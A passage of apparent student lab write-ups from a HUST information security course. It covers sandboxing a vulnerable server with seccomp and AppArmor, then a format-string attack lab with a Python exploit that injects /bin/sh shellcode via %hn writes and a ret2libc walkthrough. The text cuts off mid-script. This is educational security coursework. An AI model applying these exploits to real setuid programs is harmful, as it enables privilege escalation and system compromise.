class="type">int</span> argc, <span class="type">char</span>** argv)</span> </span>&#123;  </span><br><span class="line">    …  </span><br><span class="line">    <span class="built_in">init_seccomp</span>();  </span><br><span class="line">    …  </span><br><span class="line">&#125;  </span><br></pre></td></tr></table></figure><p>Compile and run server</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">sudo make  </span><br><span class="line">sudo chown root touchstone  </span><br><span class="line">sudo chmod +s touchstone  </span><br><span class="line">sudo ./touchstone  </span><br></pre></td></tr></table></figure><h4 id="Default-deny-explicit-allow"><a href="#Default-deny-explicit-allow" class="headerlink" title="Default deny, explicit allow"></a>Default deny, explicit allow</h4><p>Modify banksv.c, add the following code, deny all rules by default, and add allowed rules, then load seccomp.</p><p><img src="https://raw.githubusercontent.com/hustlixiang21/blog-image/main/image-20240619172906034.png" alt="image-20240619172906034"></p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">void</span> <span class="title">setup_deny_bydefault_rules</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="type">int</span> ret;  </span><br><span class="line">  scmp_filter_ctx ctx = <span class="built_in">seccomp_init</span>(SCMP_ACT_KILL);  </span><br><span class="line">  <span class="keyword">if</span>(ctx == <span class="literal">NULL</span>) &#123; <span class="built_in">exit</span>(<span class="number">-1</span>); &#125;  </span><br><span class="line">      </span><br><span class="line">  <span class="built_in">seccomp_rule_add</span>(ctx, SCMP_ACT_ALLOW, <span class="built_in">SCMP_SYS</span>(read), <span class="number">0</span>);  </span><br><span class="line">  <span class="built_in">seccomp_rule_add</span>(ctx, SCMP_ACT_ALLOW, <span class="built_in">SCMP_SYS</span>(write), <span class="number">0</span>);  </span><br><span class="line">  <span class="built_in">seccomp_rule_add</span>(ctx, SCMP_ACT_ALLOW, <span class="built_in">SCMP_SYS</span>(openat), <span class="number">0</span>);  </span><br><span class="line">  <span class="built_in">seccomp_rule_add</span>(ctx, SCMP_ACT_ALLOW, <span class="built_in">SCMP_SYS</span>(rt_sigaction), <span class="number">0</span>);  </span><br><span class="line">  <span class="built_in">seccomp_rule_add</span>(ctx, SCMP_ACT_ALLOW, <span class="built_in">SCMP_SYS</span>(socketcall), <span class="number">0</span>);  </span><br><span class="line">  <span class="built_in">seccomp_rule_add</span>(ctx, SCMP_ACT_ALLOW, <span class="built_in">SCMP_SYS</span>(clone), <span class="number">0</span>);  </span><br><span class="line">  <span class="built_in">seccomp_rule_add</span>(ctx, SCMP_ACT_ALLOW, <span class="built_in">SCMP_SYS</span>(set_robust_list), <span class="number">0</span>);  </span><br><span class="line">  <span class="built_in">seccomp_rule_add</span>(ctx, SCMP_ACT_ALLOW, <span class="built_in">SCMP_SYS</span>(getresuid32), <span class="number">0</span>);  </span><br><span class="line">  <span class="built_in">seccomp_rule_add</span>(ctx, SCMP_ACT_ALLOW, <span class="built_in">SCMP_SYS</span>(getcwd), <span class="number">0</span>);  </span><br><span class="line">  <span class="built_in">seccomp_rule_add</span>(ctx, SCMP_ACT_ALLOW, <span class="built_in">SCMP_SYS</span>(getpid), <span class="number">0</span>);  </span><br><span class="line">  <span class="built_in">seccomp_rule_add</span>(ctx, SCMP_ACT_ALLOW, <span class="built_in">SCMP_SYS</span>(statx), <span class="number">0</span>);  </span><br><span class="line">  <span class="built_in">seccomp_rule_add</span>(ctx, SCMP_ACT_ALLOW, <span class="built_in">SCMP_SYS</span>(close), <span class="number">0</span>);  </span><br><span class="line">  <span class="built_in">seccomp_rule_add</span>(ctx, SCMP_ACT_ALLOW, <span class="built_in">SCMP_SYS</span>(_llseek), <span class="number">0</span>);  </span><br><span class="line">  <span class="built_in">seccomp_rule_add</span>(ctx, SCMP_ACT_ALLOW, <span class="built_in">SCMP_SYS</span>(fcntl64), <span class="number">0</span>);  </span><br><span class="line">  <span class="built_in">seccomp_rule_add</span>(ctx, SCMP_ACT_ALLOW, <span class="built_in">SCMP_SYS</span>(access), <span class="number">0</span>);  </span><br><span class="line">  <span class="built_in">seccomp_rule_add</span>(ctx, SCMP_ACT_ALLOW, <span class="built_in">SCMP_SYS</span>(brk), <span class="number">0</span>);  </span><br><span class="line">  <span class="built_in">seccomp_rule_add</span>(ctx, SCMP_ACT_ALLOW, <span class="built_in">SCMP_SYS</span>(exit_group), <span class="number">0</span>);  </span><br><span class="line">  <span class="built_in">seccomp_rule_add</span>(ctx, SCMP_ACT_ALLOW, <span class="built_in">SCMP_SYS</span>(fchmod), <span class="number">0</span>); </span><br><span class="line">  <span class="built_in">seccomp_rule_add</span>(ctx, SCMP_ACT_ALLOW, <span class="built_in">SCMP_SYS</span>(stat64), <span class="number">0</span>);  </span><br><span class="line">  <span class="built_in">seccomp_rule_add</span>(ctx, SCMP_ACT_ALLOW, <span class="built_in">SCMP_SYS</span>(fstat64), <span class="number">0</span>);  </span><br><span class="line">  <span class="built_in">seccomp_rule_add</span>(ctx, SCMP_ACT_ALLOW, <span class="built_in">SCMP_SYS</span>(geteuid32), <span class="number">0</span>);  </span><br><span class="line">  <span class="built_in">seccomp_rule_add</span>(ctx, SCMP_ACT_ALLOW, <span class="built_in">SCMP_SYS</span>(fchown32), <span class="number">0</span>);  </span><br><span class="line">  <span class="built_in">seccomp_rule_add</span>(ctx, SCMP_ACT_ALLOW, <span class="built_in">SCMP_SYS</span>(fsync), <span class="number">0</span>);</span><br><span class="line">    </span><br><span class="line">  <span class="comment">// Permissions needed by attack program</span></span><br><span class="line">  <span class="built_in">seccomp_rule_add</span>(ctx, SCMP_ACT_ALLOW, <span class="built_in">SCMP_SYS</span>(system), <span class="number">0</span>);</span><br><span class="line">  <span class="built_in">seccomp_rule_add</span>(ctx, SCMP_ACT_ALLOW, <span class="built_in">SCMP_SYS</span>(unlink), <span class="number">0</span>);</span><br><span class="line">  </span><br><span class="line">  ret = <span class="built_in">seccomp_load</span>(ctx);  </span><br><span class="line">  <span class="keyword">if</span>(ret &lt; <span class="number">0</span>) &#123; <span class="built_in">exit</span>(<span class="number">-1</span>); &#125;  </span><br><span class="line">  <span class="built_in">seccomp_release</span>(ctx);  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>Compile and run server</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">sudo make  </span><br><span class="line">sudo chown root touchstone  </span><br><span class="line">sudo chmod +s touchstone  </span><br><span class="line">sudo ./touchstone  </span><br></pre></td></tr></table></figure><h3 id="Perform-exploit-test-2"><a href="#Perform-exploit-test-2" class="headerlink" title="Perform exploit test"></a>Perform exploit test</h3><h4 id="Default-allow-explicit-deny-1"><a href="#Default-allow-explicit-deny-1" class="headerlink" title="Default allow, explicit deny"></a>Default allow, explicit deny</h4><p>First create test files</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">sudo touch /tmp/test.txt  </span><br><span class="line">sudo chown root /tmp/test.txt  </span><br><span class="line">ll /tmp/test.txt</span><br></pre></td></tr></table></figure><p>Both file deletion and shell acquisition failed, and there will also be system error report popups. The specific results are as shown below, with two audit logs appearing in the dmesg kernel messages.</p><p><img src="https://raw.githubusercontent.com/hustlixiang21/blog-image/main/image-20240619172118447.png" alt="image-20240619172118447"></p><p>This approach will bring negative effects, such as inability to register and connection reset.</p><p><img src="https://raw.githubusercontent.com/hustlixiang21/blog-image/main/image-20240619171801241.png" alt="image-20240619171801241"></p><h4 id="Default-deny-explicit-allow-1"><a href="#Default-deny-explicit-allow-1" class="headerlink" title="Default deny, explicit allow"></a>Default deny, explicit allow</h4><p>First create test files</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">sudo touch /tmp/test.txt  </span><br><span class="line">sudo chown root /tmp/test.txt  </span><br><span class="line">ll /tmp/test.txt</span><br></pre></td></tr></table></figure><p>Both file deletion and shell acquisition failed, results as shown below:</p><p><img src="https://raw.githubusercontent.com/hustlixiang21/blog-image/main/image-20240621133745249.png" alt="image-20240621133745249"></p><p>With the help of AI, the meaning of the audit logs is as follows</p><p><img src="https://raw.githubusercontent.com/hustlixiang21/blog-image/main/image-20240621134819072.png" alt="image-20240621134819072"></p><p>But I feel this is more troublesome, must determine which system calls need to be used, personally think it’s not as good as the previous one.</p><h3 id="Defense-Result-Analysis-2"><a href="#Defense-Result-Analysis-2" class="headerlink" title="Defense Result Analysis"></a>Defense Result Analysis</h3><p>seccomp (full name secure computing mode) is a sandbox security mechanism. In Linux systems, a large number of system calls are directly exposed to user-space programs. However, not all system calls are needed, and unsafe code abusing system calls can pose security threats to the system. Through seccomp, <strong>restrict programs from using certain system calls</strong>, which can reduce the system’s attack surface and put programs into a “secure” state, similar to a <strong>firewall for system calls</strong>.</p><h2 id="Use-AppArmor-to-constrain-web-server’s-vulnerable-process-test-exploit"><a href="#Use-AppArmor-to-constrain-web-server’s-vulnerable-process-test-exploit" class="headerlink" title="Use AppArmor to constrain web server’s vulnerable process, test exploit"></a>Use AppArmor to constrain web server’s vulnerable process, test exploit</h2><h3 id="Experiment-Environment-Configuration-4"><a href="#Experiment-Environment-Configuration-4" class="headerlink" title="Experiment Environment Configuration"></a>Experiment Environment Configuration</h3><p>Use cp to create a new code directory code_apparmor, then need to start apparmor and install related tools.</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">cp -r ./code ./code_apparmor</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">Install AppArmor and related tools</span> </span><br><span class="line">sudo systemctl start apparmor</span><br><span class="line">sudo apt install apparmor-profiles apparmor-utils </span><br></pre></td></tr></table></figure><h3 id="Apply-AppArmor"><a href="#Apply-AppArmor" class="headerlink" title="Apply AppArmor"></a>Apply AppArmor</h3><p>After the server starts running, use aa-genprof to generate configuration file for banksv in the directory:</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">sudo ./touchstone </span><br><span class="line"></span><br><span class="line">sudo aa-genprof banksv</span><br></pre></td></tr></table></figure><p>Press F to skip, and combine aa-logprof with manually adding rules to improve the configuration file. The configuration file path is <code>/etc/apparmor.d/home.lixiang.Desktop.lab2.code_apparmor.banksv</code>.</p><p><img src="https://raw.githubusercontent.com/hustlixiang21/blog-image/main/image-20240619184538978.png" alt="image-20240619184538978"></p><p>Open the configuration file and write the following content:</p><p><img src="https://raw.githubusercontent.com/hustlixiang21/blog-image/main/image-20240619185627994.png" alt="image-20240619185627994"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"># Last Modified: Wed Jun 19 03:45:02 2024</span><br><span class="line">#include &lt;tunables/global&gt;</span><br><span class="line"></span><br><span class="line">/home/lixiang/Desktop/lab2/code_apparmor/banksv &#123;</span><br><span class="line"></span><br><span class="line">  # Include apache2-common and base abstractions, these abstractions contain some common permission settings.</span><br><span class="line">  include &lt;abstractions/apache2-common&gt;  </span><br><span class="line">  include &lt;abstractions/base&gt;  </span><br><span class="line">  </span><br><span class="line">  # Deny read/write operations on any files in /tmp directory  </span><br><span class="line">  deny /tmp/** mrwx,  </span><br><span class="line"></span><br><span class="line">  # Allow read-only access to all files in code_task5 directory</span><br><span class="line">  /home/lixiang/Desktop/lab2/code_apparmor/** mr,</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>Reload the configuration file to make the above configuration file effective:</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo apparmor_parser -r /etc/apparmor.d/home.lixiang.Desktop.lab2.code_apparmor.banksv</span><br></pre></td></tr></table></figure><h3 id="Perform-exploit-test-3"><a href="#Perform-exploit-test-3" class="headerlink" title="Perform exploit test"></a>Perform exploit test</h3><p>First create test files</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">sudo touch /tmp/test.txt  </span><br><span class="line">sudo chown root /tmp/test.txt  </span><br><span class="line">ll /tmp/test.txt</span><br></pre></td></tr></table></figure><p>File deletion failed:</p><p><img src="https://raw.githubusercontent.com/hustlixiang21/blog-image/main/image-20240619190107460.png" alt="image-20240619190107460"></p><p>Shell acquisition failed:</p><p><img src="https://raw.githubusercontent.com/hustlixiang21/blog-image/main/image-20240619190000149.png" alt="image-20240619190000149"></p><p>Use dmesg to view kernel output logs, found two deny rules, exactly shell execution and unlink:</p><p><img src="https://pic1.zhimg.com/80/v2-942e24274ddd70aa2ded5bd3200b36f7_720w.png" alt="image-20240619191557469"></p><h3 id="Problems-Encountered-1"><a href="#Problems-Encountered-1" class="headerlink" title="Problems Encountered"></a>Problems Encountered</h3><p>Once defining deny for &#x2F;tmp folder in the configuration file, using dmesg cannot see the unlink denied message, but not defining it can see it, which feels very strange. Another possibility is that the included configuration files themselves contain the most basic access control, including unlink, but file path restrictions will directly cause a problem which is <strong>access interception</strong>, <strong>file access requests are completely intercepted at the file system level, programs may not have the opportunity to try <code>unlink</code> operations</strong>.</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"># Deny read/write operations on any files in /tmp directory  </span><br><span class="line">deny /tmp/** mrwx,  </span><br></pre></td></tr></table></figure><h3 id="Defense-Result-Analysis-3"><a href="#Defense-Result-Analysis-3" class="headerlink" title="Defense Result Analysis"></a>Defense Result Analysis</h3><p>AppArmor (Application Armor) is a Linux kernel security module used to limit program capabilities, allowing system administrators to define what resources each program can access. AppArmor uses a path-based access control mechanism, defining program security policies through configuration files.</p><p>Main features of AppArmor:</p><ol><li><strong>Path-based access control</strong>:<ul><li>Use file system paths to define access control rules.</li><li>Configuration files specify which files, directories and resources programs can access.</li></ul></li><li><strong>Configuration files</strong>:<ul><li>Each protected program has a corresponding configuration file, usually located in the <code>/etc/apparmor.d/</code> directory.</li><li>Configuration files define program permissions, including file access, network access, capabilities, etc.</li></ul></li><li><strong>Two modes</strong>:<ul><li><strong>Enforcing mode</strong>: Strictly enforce rules in configuration files, any behavior violating rules will be blocked and logged.</li><li><strong>Complain mode</strong>: Log behavior violating rules, but don’t block operations. This mode is commonly used for debugging and configuring rules.</li></ul></li><li><strong>Integrated into Linux kernel</strong>:<ul><li>As part of Linux Security Modules (LSM), directly implemented in the kernel, providing efficient security control.</li></ul></li><li><strong>Flexibility</strong>:<ul><li>Support different abstraction files (such as <code>&lt;abstractions/base&gt;</code> and <code>&lt;abstractions/apache2-common&gt;</code>), used to simplify configuration of common permissions.</li></ul></li></ol>]]></content>
      
      
      <categories>
          
          <category> CS Study Notes </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Study Notes </tag>
            
            <tag> Course Experiments </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>HUST Information System Security Lab1-Software Security</title>
      <link href="/2024/09/26/HUST%20Information%20System%20Security%20Lab1-Software%20Security/"/>
      <url>/2024/09/26/HUST%20Information%20System%20Security%20Lab1-Software%20Security/</url>
      
        <content type="html"><![CDATA[<h1 id="Information-System-Security-Lab1-Record"><a href="#Information-System-Security-Lab1-Record" class="headerlink" title="Information System Security Lab1 Record"></a>Information System Security Lab1 Record</h1><h2 id="prog1-Change-var-Value"><a href="#prog1-Change-var-Value" class="headerlink" title="prog1 Change var Value"></a>prog1 Change var Value</h2><p>Attack approach: Exploit printf function vulnerability, use %.nx for n-digit length characters, then use %n to write the length of previously printed characters at the given address.</p><ol><li><p>First, configure the environment and compile the program</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">Disable ASLR</span></span><br><span class="line">sudo sysctl -w kernel.randomize_va_space=0 </span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">Compile prog1.c as 32-bit, need to modify fread to fgets <span class="keyword">in</span> the <span class="built_in">source</span> file</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">Remember not to use -fno-stack-protector option</span></span><br><span class="line">gcc -z execstack -o prog1 prog1.c</span><br></pre></td></tr></table></figure></li><li><p>Execute the program and view the layout</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">%08x | %08x | %08x | %08x | %08x</span></span><br><span class="line">.\prog1</span><br></pre></td></tr></table></figure><p> <img src="https://raw.githubusercontent.com/hustlixiang21/blog-image/main/image-20240607173607151.png" alt="1"></p></li><li><p>Construct format string to modify to 0x66887799</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sh exploit_prog1_1.sh bfffed54</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/hustlixiang21/blog-image/main/image-20240607181143060.png" alt="2"></p></li><li><p>Construct format string to modify to 0xdeadbeef</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sh exploit_prog1_2.sh bfffed54</span><br></pre></td></tr></table></figure></li></ol><h2 id="prog2-shellcode-injection-obtain-shell"><a href="#prog2-shellcode-injection-obtain-shell" class="headerlink" title="prog2 shellcode injection, obtain shell"></a>prog2 shellcode injection, obtain shell</h2><p>Attack approach: Modify the function return address to the address of the injected <code>shellcode</code>. Note that shellcode executes on the stack, so <strong>enable stack execution</strong>.</p><ol><li><p>Enable stack protection and stack execution</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gcc -fstack-protector -z execstack prog2.c -o prog2</span><br></pre></td></tr></table></figure></li><li><p>Look at the relevant addresses, need to overwrite the return address to the shellcode address</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">echo -e &quot;%08x | %08x | %08x | %08x | %08x | %08x | %08x | %08x | %08x | %08x | %08x | %08x | %08x | %08x | %08x | %08x | %08x | %08x | %08x | %08x&quot; &gt; input2</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/hustlixiang21/blog-image/main/image-20240613165532651.png" alt="3"></p></li><li><p>Also need to confirm how many %.8x are needed to point the pointer to the beginning of the str array</p><p><img src="https://raw.githubusercontent.com/hustlixiang21/blog-image/main/image-20240613173553393.png" alt="4"></p></li><li><p>Our goal is to overwrite the return address to a position in the array, then obtain shell through sled instructions. Fill in the corresponding parameters in exploit.py. To hit the sled instructions, we need to add a number, need to try several times, basically 80 is just enough.</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python3</span></span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"></span><br><span class="line"><span class="comment"># This shellcode creates a local shell</span></span><br><span class="line">local_shellcode= (</span><br><span class="line">  <span class="string">&quot;\x31\xc0\x31\xdb\xb0\xd5\xcd\x80&quot;</span></span><br><span class="line">  <span class="string">&quot;\x31\xc0\x50\x68//sh\x68/bin\x89\xe3\x50&quot;</span></span><br><span class="line">  <span class="string">&quot;\x53\x89\xe1\x99\xb0\x0b\xcd\x80\x00&quot;</span></span><br><span class="line">).encode(<span class="string">&#x27;latin-1&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">N = <span class="number">200</span></span><br><span class="line"><span class="comment"># Fill the content with NOP&#x27;s</span></span><br><span class="line">content = <span class="built_in">bytearray</span>(<span class="number">0x90</span> <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(N))</span><br><span class="line"></span><br><span class="line"><span class="comment"># Put the code at the end</span></span><br><span class="line">start = N - <span class="built_in">len</span>(local_shellcode)</span><br><span class="line">content[start:] = local_shellcode</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># Put the address at the beginning</span></span><br><span class="line">addr1 = <span class="number">0xffffd0ae</span></span><br><span class="line">addr2 = <span class="number">0xffffd0ac</span></span><br><span class="line">content[<span class="number">0</span>:<span class="number">4</span>]  =  (addr1).to_bytes(<span class="number">4</span>,byteorder=<span class="string">&#x27;little&#x27;</span>)</span><br><span class="line">content[<span class="number">4</span>:<span class="number">8</span>]  =  (<span class="string">&quot;@@@@&quot;</span>).encode(<span class="string">&#x27;latin-1&#x27;</span>)</span><br><span class="line">content[<span class="number">8</span>:<span class="number">12</span>]  = (addr2).to_bytes(<span class="number">4</span>,byteorder=<span class="string">&#x27;little&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># Calculate the value of C</span></span><br><span class="line">C = <span class="number">15</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># For investigation purpose (trial and error)</span></span><br><span class="line"><span class="comment">#s = &quot;%.8x_&quot;*C + &quot;%n&quot;  + &quot;\n&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Construct the format string</span></span><br><span class="line">small = <span class="number">0xffff</span> - <span class="number">12</span> - C*<span class="number">8</span></span><br><span class="line">large = <span class="number">0x1d0c4</span> - <span class="number">0xffff</span> + <span class="number">75</span></span><br><span class="line">s = <span class="string">&quot;%.8x&quot;</span>*C + <span class="string">&quot;%.&quot;</span> + <span class="built_in">str</span>(small) + <span class="string">&quot;x&quot;</span> + <span class="string">&quot;%hn&quot;</span>        \</span><br><span class="line">                  + <span class="string">&quot;%.&quot;</span> + <span class="built_in">str</span>(large) + <span class="string">&quot;x&quot;</span> + <span class="string">&quot;%hn&quot;</span> </span><br><span class="line">fmt  = (s).encode(<span class="string">&#x27;latin-1&#x27;</span>)</span><br><span class="line">content[<span class="number">12</span>:<span class="number">12</span>+<span class="built_in">len</span>(fmt)] = fmt</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(content)</span><br><span class="line"></span><br><span class="line"><span class="comment"># Write the content to badfile</span></span><br><span class="line">file = <span class="built_in">open</span>(<span class="string">&quot;input2&quot;</span>, <span class="string">&quot;wb&quot;</span>)</span><br><span class="line">file.write(content)</span><br><span class="line">file.close()</span><br></pre></td></tr></table></figure></li></ol><h2 id="prog2-ret2libc-injection-obtain-shell"><a href="#prog2-ret2libc-injection-obtain-shell" class="headerlink" title="prog2 ret2libc injection, obtain shell"></a>prog2 ret2libc injection, obtain shell</h2><p>Attack approach: This requires enabling stack non-executable protection, so we need to bypass it through ret2libc to obtain shell, i.e., using <code>system(&quot;/bin/sh&quot;)</code></p><ol><li><p>Enable Stack Guard and stack non-executable protection, compile command as follows:</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gcc -fstack-protector -z noexecstack prog2.c -o prog2</span><br></pre></td></tr></table></figure></li><li><p>First run the program tentatively</p><p><img src="https://raw.githubusercontent.com/hustlixiang21/blog-image/main/image-20240614171040392.png" alt="image-20240614171040392"></p></li><li><p>Next, need to find the corresponding addresses and construct stack details before control flow hijacking. Specifically, need to find the addresses of <code>system()</code> function and string <code>/bin/sh</code>.</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">Method 1 -- Directly obtain through gdb</span></span><br><span class="line">gdb -q prog2</span><br><span class="line">b printf</span><br><span class="line">run</span><br><span class="line">info proc map</span><br><span class="line">searchmem &quot;/bin/sh&quot; 0xb7d6a000 0xb7f1d000 # Search for string from libc start address to end address on heap</span><br><span class="line">p system</span><br><span class="line">p exit</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">Method 2 -- Obtain through calculation (.so base address + offset address)</span></span><br><span class="line">ldd ./prog2</span><br><span class="line">readelf -a /lib/i386-linux-gnu/libc.so.6 | grep &quot;system&quot;</span><br><span class="line">readelf -a /lib/i386-linux-gnu/libc.so.6 | grep &quot;setuid&quot;</span><br><span class="line">readelf -a /lib/i386-linux-gnu/libc.so.6 | grep &quot;exit&quot;</span><br><span class="line">ropper --file /lib32/libc.so.6 --string &quot;/bin/sh&quot;</span><br><span class="line">gdb -q prog2</span><br><span class="line">b printf</span><br><span class="line">run</span><br><span class="line">info proc map</span><br></pre></td></tr></table></figure><p>First method results:</p><p><img src="https://raw.githubusercontent.com/hustlixiang21/blog-image/main/image-20240614171317292.png" alt="image-20240614171317292"><br><img src="https://raw.githubusercontent.com/hustlixiang21/blog-image/main/image-20240614171351094.png" alt="image-20240614171351094"><br><img src="https://raw.githubusercontent.com/hustlixiang21/blog-image/main/image-20240614171414459.png" alt="image-20240614171414459"></p><p>Second method results:</p><p><img src="https://raw.githubusercontent.com/hustlixiang21/blog-image/main/image-20240614114521711.png" alt="image-20240614114521711"></p><p>Both methods calculate the same results: system: 0xb7da4da0, exit: 0xb7d989d0, “&#x2F;bin&#x2F;sh”: 0xb7ec582b</p></li><li><p>Construct shellcode, overwrite return address to system function address, return address+4 is exit function address, return address+8 as system function parameter overwrite to &#x2F;bin&#x2F;sh address.</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span 